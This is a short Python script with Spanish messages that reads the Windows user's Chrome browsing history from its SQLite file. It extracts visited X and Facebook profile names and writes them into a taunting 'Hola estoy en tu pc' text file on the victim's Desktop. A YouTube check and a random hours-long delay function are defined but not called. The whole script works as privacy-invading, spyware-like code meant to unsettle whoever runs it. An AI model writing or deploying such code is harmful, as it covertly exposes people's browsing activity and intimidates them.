import os
import random
import re
import time
import sqlite3

USER_PATH = "c:\\Users\\" + os.getlogin()
DESKTOP_PATH = USER_PATH + "\\Desktop\\"


def archive (USER_PATH):
    archivo = open(DESKTOP_PATH + "HOLA.txt", "w")
    archivo.write("Hola estoy en tu pc")
    return archivo

def num_random ():
    num_creado = random.randrange(1,4)

    return num_creado
def chrome_history (user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls

        except sqlite3.OperationalError:
            print("reintentando en 5 segundos")
            time.sleep(5)


def delay():
    tiempo_dormir = ((num_random() * 3600) + (random.randrange(1, 61) * 60) + random.randrange(1, 61))
    time.sleep(tiempo_dormir)




def check_twitter(archivo, history_chrome):
    profiles_visited = []
    for item in history_chrome:
        results = re.findall("https://x.com/([A-Za-z0-9]+)$", item [2])
        if results and results [0] not in ["notifications", "home"]:
            profiles_visited.append(results[0])
    archivo.write("\n He visto que has visitado {} \n".format(", ".join(profiles_visited)))




def check_youtube(archivo, history_chrome):
    profiles_visited = []
    for item in history_chrome:
        results = re.findall("https://www.youtube.com/@([A-Za-z0-9]+)$", item[2])
        if results:
            profiles_visited.append(results[0])

    archivo.write("\n Haz estado recientemente en los canales de: {}...".format(", ".join(profiles_visited)))


def check_facebook(archivo, history_chrome):
    profiles_visited = []
    for item in history_chrome:
        results = re.findall("https://www.facebook.com/([A-Za-z]+)$", item[2])
        if results:
            profiles_visited.append(results[0])
    archivo.write("\n Tambien has visto los perfiles de facebook de: {}".format(", ".join(profiles_visited)))


def main():

    archivo = archive(USER_PATH)
    history_chrome = chrome_history(USER_PATH)
    print(history_chrome)
    check_twitter(archivo, history_chrome)
    check_facebook(archivo, history_chrome)





if __name__ == '__main__':
    main()